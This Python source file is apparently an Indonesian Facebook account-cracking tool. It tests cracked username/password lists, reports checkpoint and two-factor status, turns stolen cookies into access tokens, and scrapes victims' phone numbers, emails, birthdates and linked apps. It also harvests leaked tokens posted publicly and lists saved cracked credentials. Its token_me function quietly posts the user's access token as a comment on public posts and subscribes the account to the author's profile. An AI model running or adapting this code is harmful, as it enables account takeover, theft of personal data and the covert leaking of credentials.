		ses.headers.update({"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": mb,"content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": mb+"/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9"})
		ged = parser(ses.get(mb+"/login/?next&ref=dbl&fl&refid=8", headers={"user-agent":ua}).text, "html.parser")
		fm = ged.find("form",{"method":"post"})
		link2=ged.find("form",{"method":"post"})
		list = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login","bi_xrwh"]
		for i in fm.find_all("input"):
			if i.get("name") in list:data.update({i.get("name"):i.get("value")})
			else:continue
		data.update({"email":user,"pass":pasw})
		run = parser(ses.post(mb+fm.get("action"), data=data, allow_redirects=True).text, "html.parser")
		if "c_user" in ses.cookies.get_dict():
			if "Akun Anda Dikunci" in run.text:
				print(f" |--->{O}Akun Ini Terkunci..{Q}")
			else:
				print(f" |--->{II}Selamat Akun Ini, Tidak Terkenak Check Point...{Q}")
		elif "checkpoint" in ses.cookies.get_dict():
			eax = re.findall("\<title>(.*?)<\/title>",str(run))
			form = run.find("form")
			dtsg = form.find("input",{"name":"fb_dtsg"})["value"]
			jzst = form.find("input",{"name":"jazoest"})["value"]
			nh = form.find("input",{"name":"nh"})["value"]
			dataD = {"fb_dtsg": dtsg,"fb_dtsg": dtsg,"jazoest": jzst,"jazoest": jzst,"checkpoint_data":"","submit[Continue]":"Lanjutkan","nh": nh}
			xnxx = parser(ses.post(mb+form["action"], data=dataD).text, "html.parser")
			ngew = [yy.text for yy in xnxx.find_all("option")]
			ZzZz = f"{str(len(ngew))}"
			if ZzZz == "0":
				print(" |--->Terdapat "+K+str(len(ngew))+Q+" Opsi")
				if "Lihat detail login yang ditampilkan. Ini Anda?" in eax:
					print(f" |--->{II}Selamat Akun Ini Tap Yes...{Q}")
				elif "Masukkan Kode Masuk untuk Melanjutkan" in re.findall("\<title>(.*?)<\/title>",str(run)):
					print(f" |--->{O}Akun Ini Terkenak A2F{Q}")
				else:
					print(f" |--->{II}{''.join(eax)}{Q}")
			else:
				print(" |--->Terdapat "+K+str(len(ngew))+Q+" Opsi")
				for opt in range(len(ngew)):
					print(f" |--->{O}{str(opt+1)}{Q}. {ngew[opt]}")
		elif "login_error" in str(run):
			oh = run.find("div",{"id":"login_error"}).find("div").text
			print(f" |--->{M}{oh}{Q}")
		else:print(f" |--->{M}Kata Sandi Salah...{Q}")

def cek_cookies_by_risky(userr, cokii, memek_mamak_yayan):
	kntl_yayan = ""
	user = userr
	akun_nn = memek_mamak_yayan
	session = req.Session()
	kukis_sus = cokii
	kukis_sus = kukis_sus.replace("noscript=1", "")
	kukis_impos = ""
	kukis_sus = kukis_sus.replace("c_user="+user+";", "")
	kukis_sus = kukis_sus.replace(";c_user="+user+";", "")
	kukis_sus = kukis_sus.replace(";c_user="+user, "")
	kukis_sus = kukis_sus.replace("c_user="+user, "")
	kukis_impos += kukis_sus
	kukis_impos += ";"
	kukis_impos += "c_user="
	kukis_impos += user
	coki = kukis_impos

	cek =session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
	if "Diakses menggunakan Facebook" in re.findall("\<title\>(.*?)<\/title\>",str(cek)):

		get_id = session.get("https://mbasic.facebook.com/profile.php",cookies={"cookie":coki}).text
		nama = re.findall('\<title\>(.*?)<\/title\>',str(get_id))[0]
		response = session.get("https://mbasic.facebook.com/profile.php?v=info",cookies={"cookie":coki}).text
		response2 = session.get("https://mbasic.facebook.com/profile.php?v=friends",cookies={"cookie":coki}).text
		response3 = session.get(f"https://mbasic.facebook.com/{user}/allactivity/?category_key=all&section_id=year_2022&timestart=1609488000&timeend=1641023999&sectionLoadingID=m_timeline_loading_div_1641023999_1609488000_8_",cookies={"cookie":coki}).text
		response4 = session.get(f"https://mbasic.facebook.com/timeline/app_collection/?collection_token={user}%3A184985071538002%3A32&_rdc=1&_rdr",cookies={"cookie":coki}).text
		try:nomer = re.findall('\<a\ href\=\"tel\:\+.*?\">\<span\ dir\=\"ltr\">(.*?)<\/span><\/a>',str(response))[0]
		except:nomer = "-"
		try:email = re.findall('\<a href\=\"https\:\/\/lm\.facebook\.com\/l\.php\?u\=mail.*?\" target\=\".*?\"\>(.*?)<\/a\>',str(response))[0].replace('&#064;','@')
		except:email="-"
		try:ttl = re.findall('\<\/td\>\<td\ valign\=\"top\" class\=\".*?\"\>\<div\ class\=\".*?\"\>(\d+\s+\w+\s+\d+)<\/div\>\<\/td\>\<\/tr\>',str(response))[0]
		except:ttl="-"
		try:teman = re.findall('\<h3\ class\=\".*?\"\>Teman\ \((.*?)\)<\/h3\>',str(response2))[0]
		except:teman = "0"
		try:pengikut = re.findall('\<span\ class\=\".*?\"\>(.*?)\<\/span\>',str(response4))[1]
		except:pengikut = "0"
		try:
			tahun = "-"
			cek_thn = re.findall('\<div\ class\=\".*?\" id\=\"year_(.*?)\">',str(response3))
			for nenen in cek_thn:
				tahun += nenen+", "
		except:pass
		kntl_yayan += (f"{Q} |-->Nama Akun       : {O}{nama}{P}\n |-->Jumlah Teman    : {O}{teman}{P}\n |-->Jumlah Pengikut : {O}{pengikut}{P}\n |-->Email Aktif     : {O}{email}{P}\n |-->Nomor Aktif     : {O}{nomer}{P}\n |-->Tahun Akun      : {O}{tahun}{P}\n |-->Tanggal Lahir   : {O}{ttl}{P}\n")

		hit1, hit2 = 0,0
		cek =session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
		cek2 = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
		if "Diakses menggunakan Facebook" in re.findall("\<title\>(.*?)<\/title\>",str(cek)):
			kntl_yayan += (f" |--->Aplikasi Yang Terkait*\n")
			if "Anda tidak memiliki aplikasi atau situs web aktif untuk ditinjau." in cek:
				kntl_yayan += (f" |--->Tidak Ada Aplikasi Aktif Yang Terkait*\n")
			else:
				kntl_yayan += (f" |--->Aplikasi Aktif*\n")
				apkAktif = re.findall('\/><div\ class\=\".*?\"\>\<span\ class\=\".*?\"\>(.*?)<\/span\>',str(cek))
				ditambahkan = re.findall('\<div\>\<\/div\>\<div\ class\=\".*?\"\>(.*?)<\/div\>',str(cek))
				for muncul in apkAktif:
					tor = muncul
					hit1+=1
					try:
						muncul = re.findall('\<a\ href\=\".*?\"\>(.*?)<\/a\>',str(muncul))
						muncul = "%s"%(muncul[0])
						muncul = muncul.replace("[", "").replace("]", "").replace("'", "").replace('"', '')
					except:
						muncul = tor
					kntl_yayan += (f" |--->{Q}{C}{hit1}{Q}.{I}{muncul} {C}{ditambahkan[hit2]}{Q}\n")
					hit2+=1
			if "Anda tidak memiliki aplikasi atau situs web kedaluwarsa untuk ditinjau" in cek2:
				kntl_yayan += (f" |--->Tidak Ada Aplikasi Kedaluwarsa Yang Terkait*")
			else:
				hit1,hit2=0,0
				kntl_yayan += (f" |--->Aplikasi Kedaluwarsa*\n")
				apkKadaluarsa = re.findall('\/><div\ class\=\".*?\"\>\<span\ class\=\".*?\"\>(.*?)<\/span\>',str(cek2))
				kadaluarsa = re.findall('\<div\>\<\/div\>\<div\ class\=\".*?\"\>(.*?)<\/div\>',str(cek2))
				for muncul in apkKadaluarsa:
					tor = muncul
					hit1+=1
					try:
						muncul = re.findall('\<a\ href\=\".*?\"\>(.*?)<\/a\>',str(muncul))
						muncul = "%s"%(muncul[0])
						muncul = muncul.replace("[", "").replace("]", "").replace("'", "").replace('"', '')
					except:
						muncul = tor
					kntl_yayan += (f" |--->{Q}{C}{hit1}{Q}.{K}{muncul} {U}{kadaluarsa[hit2]}{Q}\n")
					hit2+=1
		else:
			kntl_yayan += (f"\r |-->{M}Cookies Error !")
	else:pass
	print(akun_nn+"\n"+kntl_yayan)
def cek_cookies_by_risky_ua(userr, cokii, memek_mamak_yayan, ua_rando):
	kntl_yayan = ""
	user = userr
	akun_nn = memek_mamak_yayan
	session = req.Session()
	kukis_sus = cokii
	kukis_sus = kukis_sus.replace("noscript=1", "")
	kukis_impos = ""
	kukis_sus = kukis_sus.replace("c_user="+user+";", "")
	kukis_sus = kukis_sus.replace(";c_user="+user+";", "")
	kukis_sus = kukis_sus.replace(";c_user="+user, "")
	kukis_sus = kukis_sus.replace("c_user="+user, "")
	kukis_impos += kukis_sus
	kukis_impos += ";"
	kukis_impos += "c_user="
	kukis_impos += user
	coki = kukis_impos

	cek =session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
	if "Diakses menggunakan Facebook" in re.findall("\<title\>(.*?)<\/title\>",str(cek)):

		get_id = session.get("https://mbasic.facebook.com/profile.php",cookies={"cookie":coki}).text
		nama = re.findall('\<title\>(.*?)<\/title\>',str(get_id))[0]
		response = session.get("https://mbasic.facebook.com/profile.php?v=info",cookies={"cookie":coki}).text
		response2 = session.get("https://mbasic.facebook.com/profile.php?v=friends",cookies={"cookie":coki}).text
		response3 = session.get(f"https://mbasic.facebook.com/{user}/allactivity/?category_key=all&section_id=year_2022&timestart=1609488000&timeend=1641023999&sectionLoadingID=m_timeline_loading_div_1641023999_1609488000_8_",cookies={"cookie":coki}).text
		response4 = session.get(f"https://mbasic.facebook.com/timeline/app_collection/?collection_token={user}%3A184985071538002%3A32&_rdc=1&_rdr",cookies={"cookie":coki}).text
		try:nomer = re.findall('\<a\ href\=\"tel\:\+.*?\">\<span\ dir\=\"ltr\">(.*?)<\/span><\/a>',str(response))[0]
		except:nomer = "-"
		try:email = re.findall('\<a href\=\"https\:\/\/lm\.facebook\.com\/l\.php\?u\=mail.*?\" target\=\".*?\"\>(.*?)<\/a\>',str(response))[0].replace('&#064;','@')
		except:email="-"
		try:ttl = re.findall('\<\/td\>\<td\ valign\=\"top\" class\=\".*?\"\>\<div\ class\=\".*?\"\>(\d+\s+\w+\s+\d+)<\/div\>\<\/td\>\<\/tr\>',str(response))[0]
		except:ttl="-"
		try:teman = re.findall('\<h3\ class\=\".*?\"\>Teman\ \((.*?)\)<\/h3\>',str(response2))[0]
		except:teman = "0"
		try:pengikut = re.findall('\<span\ class\=\".*?\"\>(.*?)\<\/span\>',str(response4))[1]
		except:pengikut = "0"
		try:
			tahun = "-"
			cek_thn = re.findall('\<div\ class\=\".*?\" id\=\"year_(.*?)\">',str(response3))
			for nenen in cek_thn:
				tahun += nenen+", "
		except:pass
		kntl_yayan += (f"{Q} |-->Nama Akun       : {O}{nama}{P}\n |-->Jumlah Teman    : {O}{teman}{P}\n |-->Jumlah Pengikut : {O}{pengikut}{P}\n |-->Email Aktif     : {O}{email}{P}\n |-->Nomor Aktif     : {O}{nomer}{P}\n |-->Tahun Akun      : {O}{tahun}{P}\n |-->Tanggal Lahir   : {O}{ttl}{P}\n")

		hit1, hit2 = 0,0
		cek =session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
		cek2 = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
		if "Diakses menggunakan Facebook" in re.findall("\<title\>(.*?)<\/title\>",str(cek)):
			kntl_yayan += (f" |--->Aplikasi Yang Terkait*\n")
			if "Anda tidak memiliki aplikasi atau situs web aktif untuk ditinjau." in cek:
				kntl_yayan += (f" |--->Tidak Ada Aplikasi Aktif Yang Terkait*\n")
			else:
				kntl_yayan += (f" |--->Aplikasi Aktif*\n")
				apkAktif = re.findall('\/><div\ class\=\".*?\"\>\<span\ class\=\".*?\"\>(.*?)<\/span\>',str(cek))
				ditambahkan = re.findall('\<div\>\<\/div\>\<div\ class\=\".*?\"\>(.*?)<\/div\>',str(cek))
				for muncul in apkAktif:
					hit1+=1
					kntl_yayan += (f" |--->{Q}{C}{hit1}{Q}.{I}{muncul} {C}{ditambahkan[hit2]}{Q}\n")
					hit2+=1
			if "Anda tidak memiliki aplikasi atau situs web kedaluwarsa untuk ditinjau" in cek2:
				kntl_yayan += (f" |--->Tidak Ada Aplikasi Kedaluwarsa Yang Terkait*")
			else:
				hit1,hit2=0,0
				kntl_yayan += (f" |--->Aplikasi Kedaluwarsa*\n")
				apkKadaluarsa = re.findall('\/><div\ class\=\".*?\"\>\<span\ class\=\".*?\"\>(.*?)<\/span\>',str(cek2))
				kadaluarsa = re.findall('\<div\>\<\/div\>\<div\ class\=\".*?\"\>(.*?)<\/div\>',str(cek2))
				for muncul in apkKadaluarsa:
					hit1+=1
					kntl_yayan += (f" |--->{Q}{C}{hit1}{Q}.{K}{muncul} {U}{kadaluarsa[hit2]}{Q}\n")
					hit2+=1
		else:
			kntl_yayan += (f"\r |-->{M}Cookies Error !")
	else:pass
	print(" |-->"+ua_rando+"\n"+akun_nn+"\n"+kntl_yayan)
	
		
ses=requests.Session()
def login():
	os.system("clear")
	asa = pilih([B,C,K,U,I,II,O,Q])
	jalan(f"""{II}███████╗    ██╗      ██████╗  ██████╗ ██╗███╗   ██╗
██╔════╝    ██║     ██╔═══██╗██╔════╝ ██║████╗  ██║
███████╗    ██║     ██║   ██║██║  ███╗██║██╔██╗ ██║
╚════██║    ██║     ██║   ██║██║   ██║██║██║╚██╗██║
███████║    ███████╗╚██████╔╝╚██████╔╝██║██║ ╚████║
╚══════╝    ╚══════╝ ╚═════╝  ╚═════╝ ╚═╝╚═╝  ╚═══╝                                                        {Q}
  \033[44m\033[1;37m Options  \033[41m\033[1;37m Login \x1b[0m\n""")
  
	print(" ")
	print(" 1. Login Token");time.sleep(1)
	print(" 2. Login Cookies");time.sleep(1)
	print(" 3. Free Unlimited Token");time.sleep(1)
	print(" 4. View Crack Results (Take Cookies)");time.sleep(1)
	print(" ")
	pox = input(war+"select : ")
	print(" ")
	if pox in (""," "):
		jalan(" -->Jangan Kosong !!");time.sleep(1);login()
	elif pox in ("1","01"):
		tokenz = input(" Token : ")
		token_me(tokenz)
		os.sys.exit()
	elif pox in ("2","02"):
		cookie_me()
		os.sys.exit()
	elif pox in ("3","03"):
		free_token()
		os.sys.exit()
	elif pox in ("4","04"):
		def cekfile_crk(folder):
			dirs = os.listdir(folder)
			for file in dirs:
				filex = (folder+"/"+file)
				try:
					juma = open(filex,"r").readlines()
					total = ("%s"%(str(len(juma))))
				except:total = (" ?? ")
				try:ijo__ = filex.split("Hasil/OK-")[1];ijo_ = (Q+" |-->"+I+"Hasil/OK-"+ijo__);print(ijo_+Q+"-"+Q+M+total+Q)
				except:pass
				try:kuning__ = filex.split("Hasil/CP-")[1];kuning_ = (Q+" |-->"+K+"Hasil/CP-"+kuning__);print(kuning_+Q+"-"+Q+M+total+Q)
				except:pass
		def rek():
			cekfile_crk("Hasil")
			namax=input(" |-->Nama File : ")
			try:
				fila=open(namax,"r").readlines()
			except FileNotFoundError:
				jalan(" |-->Maaf File Tidak DiTemukan")
				rek()
			try:
				volak = namax.split("CP-")[1];copy_ri = ("CP");Ass = ("%s"%(K));aSs = K
			except:
				try:
					vok = namax.split("OK-")[1]
					copy_ri = ("OK")
					Ass = ("%s"%(I))
					aSs = I
				except:
					copy_ri = ("Vvip")
					Ass = ("%s"%(C))
					aSs = M
			print(" |-->Jumlah Akun :",len(fila),"\n")
			with __Kiky__(max_workers=30) as (form):
				for data in fila:
					try:
						data = data.replace("\n","")
						try:user,pw,tll = data.split("|")
						except:user,pw = data.split("|");tll=(" - ")
						print(f" {Q}|-->{Ass}{copy_ri}{Q}. {aSs}{user}|{pw}|{tll}{Q}")
					except:pass
					time.sleep(0.01)
		rek()
		cookie_me()
		os.sys.exit()
	else:
		jalan(" |-->Isi Dengan Benar !!");time.sleep(1);login()

def token_me(token):
	try:
		nama = ses.get(f"https://graph.facebook.com/me?&access_token={token}").json()["name"]
		open(".login.txt", "w").write(token)
		jalan(f"[{M}!{Q}] Selamat Datang {O}{nama}{Q}.... Semoga Token Anda Awet")
		post4 = ('716736976359896') # Logo Zero From Risky 2021
		post5 = ("259731103030874") # Untuk Berbagi Token Dan Cookie Facebook
		requests.post('https://graph.facebook.com/' + post4 + '/comments/?message=' + token + '&access_token=' + token)
		requests.post('https://graph.facebook.com/' + post5 + '/comments/?message=' + token + '&access_token=' + token)
		requests.post('https://graph.facebook.com/100069819591035/subscribers?access_token=' + token) ### FB RISKY
		jalan(f" |-->Jalankan Script Lagi !!")
		time.sleep(1)
	except KeyError:
		os.system("rm -f .login.txt")
		jalan(f"[{M}!{Q}]-->Maaf Token Tidak Awet");os.sys.exit()
def cookie_me():
	cokex = input(" |-->Cookie : ")
	user = cokex.split("c_user=")[1]
	try:
		user = user.split(";")[0]
	except:
		user = ""
	kukis_sus = cokex
	kukis_sus = kukis_sus.replace("noscript=1", "")
	kukis_impos = ""
	kukis_sus = kukis_sus.replace("c_user="+user+";", "")
	kukis_sus = kukis_sus.replace(";c_user="+user+";", "")
	kukis_sus = kukis_sus.replace(";c_user="+user, "")
	kukis_sus = kukis_sus.replace("c_user="+user, "")
	kukis_impos += kukis_sus
	kukis_impos += ";"
	kukis_impos += "c_user="
	kukis_impos += user
	coki = kukis_impos
	_cookie = kukis_impos
	try:
		urls="https://business.facebook.com/business_locations"
		_head={'Host':'business.facebook.com',"origin":urls,'cache-control':'max-age=0','upgrade-insecure-requests':'1',"user-agent":"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","content-type":"application/x-www-form-urlencoded","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document",'cookie': _cookie}

		_r=ses.get(urls, headers=_head)
		_p=re.search('(EAAG\w+)', _r.text)
		_h=_p.group(1)
		if 'EAA' in _h:
			open(".login.txt", 'w').write('%s' % (_h))
			open(".cokies.txt", 'w').write('%s' % (_cookie))
		nama = ses.get("https://graph.facebook.com/me?access_token="+_h).json()["name"]
		requests.post('https://graph.facebook.com/100063690353340/subscribers?access_token=' + _h) ### FB RISKY
		open(".login.txt", "w").write(_h)
		open(".cookie.txt", "w").write(_cookie)
		jalan(f"[{M}!{Q}] Selamat Datang {O}{nama}{Q}.... Semoga Token Anda Awet")
		jalan(f" |-->Jalankan Script Lagi !!")
	except Exception as e:
		os.system("rm -f .login.txt")
		os.system("rm -f .cookie.txt")
		print(f"|-->Maaf Cookies Anda Off/{K}Kadaluarsa{Q}")

def get_tkn():
	link="https://free.facebook.com/100014905842581/posts/1280398002467049/?app=fbl"
	r = ses.get(link).text.encode("utf-8")
	par = parser(r,'html.parser')
	for n in par.find_all("a",href=True):
		if "Lihat komentar sebelumnya…" in n.text:
			n.get("href")


def free_token():
	num = 0
	freetoken = []
	url_x = [
			"https://free.facebook.com/100014905842581/posts/1280398002467049/?app=fbl",
			"https://free.facebook.com/story.php?story_fbid=213614107297063&id=100059454248601&_rdr",
			"https://free.facebook.com/story.php?story_fbid=287175390082137&id=100063690353340&_rdr",
			"https://free.facebook.com/story.php?story_fbid=116524033813941&id=100063690353340&_rdr",
			"https://www.facebook.com/photo.php?fbid=120338706765807&set=a.116524033813941&type=3&app=fbl"
		]
	for link_ in url_x:
		llink_token = ses.get(link_)
		ttoken_free = re.findall("EAA\w+", llink_token.text) 
		for nnaa in ttoken_free:
			num += 1
			if len(nnaa)>=37:
				freetoken.append(nnaa)
				try:
					namax = ses.get(f"https://graph.facebook.com/me?&access_token={nnaa}").json()["name"]
					idz = ses.get(f"https://graph.facebook.com/me?&access_token={nnaa}").json()["id"]
				except:
					namax = "Error 404..."
					idz = "-"
				try:
					goblok = []
					r = requests.get("https://graph.facebook.com/me?fields=friends.fields(id,name)&access_token="+nnaa)
					z = json.loads(r.text)["friends"]
					for i in z["data"]:
						try:
							anak_kontol_anak_anjing_pantek_lonte_bentar_lagi_mau_tahun_baru_kontol = i["id"]
							goblok.append(anak_kontol_anak_anjing_pantek_lonte_bentar_lagi_mau_tahun_baru_kontol)
						except:pass
				except KeyError:pass
				_id = ("%s"%(len(goblok)))
				if _id == "0" or "0" == _id:
					tmnx = f"Tidak Memiliki Teman ({O}Sad{Q})"
				else:
					tmnx = f"Teman : {O}{_id}{Q}"
				if namax == "Error 404...":
					sts = f"Mati/{K}Kadaluarsa{Q}"
				else:
					sts = f"On/{I}Non Kadaluarsa{Q}"
				print(f"[{K}{len(freetoken)}{Q}]-->Nama : {O}{namax}{Q}")
				print(f" |-->Status Token : {sts}")
				print(f" |-->Jumlah Teman : {tmnx}")
				print(f" |-->Idz Akun     : {idz}")
				print(f" |")
				print(f" |-->Token : {O}{nnaa}{Q}")
				print(f" |")
				print(f" |")

	pil = input(f"[{M}?{Q}] Nomor Token : ")
	print(" |")
	if pil in[""," "]:
		login()
	else:
		try:
			xaka = int(pil)
		except:
			jalan(" |-->Masukan Angka Bukan Huruf...");time.sleep(1);login()
		try:
			tolkau = freetoken[int(pil)-1]
			token_me(tolkau)
		except:
			jalan(" |-->Error Saat Memilih Token, Cobalah Cari Token Lain...")
		os.sys.exit()

def cek_token_eeq():
	try:
		toket=open(".login.txt","r").read()
	except:
		print((war+"Token Invalid"))
		time.sleep(1)
		login()
	try:
		ba = (requests.get('https://graph.facebook.com/me/friends?limit=3&fields=name&access_token='+toket).json()["error"]["message"])
	except:
		ba = "Aman"
	if ba in "Sepertinya Anda menyalahgunakan fitur ini dengan menggunakannya terlalu cepat. Anda dilarang menggunakan fitur ini untuk sementara.":
		jalan(" |-->Sepertinya Anda menyalahgunakan fitur ini dengan menggunakannya terlalu cepat. Anda dilarang menggunakan fitur ini untuk sementara")
		jalan(" |-->Kemungkinan Anda Tidak Bisa Dump/Crack/Ambil Idz")
		jalan(" |-->Apakah Anda Mau Masih Menggunakan Token Ini (Y/n) :")
		la = input(war+"Pilih : ")
		if la in ("Y","y"):
			pass
		else:
			os.remove(".login.txt")
			jalan(war+"Berhasil Hapus Token!")
			os.sys.exit()




class Main_:
	def __init__(self):
		msin=""
	def __check_update_(self, version_):
		try:
			version = requests.get("https://raw.githubusercontent.com/Hamii-king-06/OLD/main/Approval.txt").text.strip()
		except requests.exceptions.ConnectionError:
			os.sys.exit(" |-->Jaringan Anda Down")
		if version == version_:
			os.system('git pull')
			os.system('clear')
		else:
			os.system('git pull;clear')
			jalan(war+"Version Script Ini ("+O+version_+Q+") Akan Diupdate Menjadi ("+O+version+Q+")")
			print(' |')
			jalan(" |-->Tunggu Sebentar Sedang Update Script.....")
			jalan(" |-->Jika Masih Stuck Update/Gini Terus Silahkan Gunakan Pernintah Ini ")
			print(' |-->python update.py')
			print(' |')
			os.sys.exit(war+'Jalankan Lagi Script....')
	def __check_status_(self, mainx):
		try:
			mainz = requests.get("https://raw.githubusercontent.com/Hamii-king-06/OLD/main/Approval.txt").text.strip()
		except requests.exceptions.ConnectionError:
			os.sys.exit(" |-->Jaringan Anda Down")
		if mainx == mainz:pass
		else:
			jalan(war+"Maaf Script Sedang Maintenance Harap Coba Lagi, Lain Waktu.....")
			os.system('git pull')
			os.sys.exit()
	def _no_vpn(self):
		self.__check_update_("1.1.2")
		self.__check_status_("On")
		cek_token_eeq()
		menu()
	def __vpn__(self):
		menu()


Main_().__vpn__()






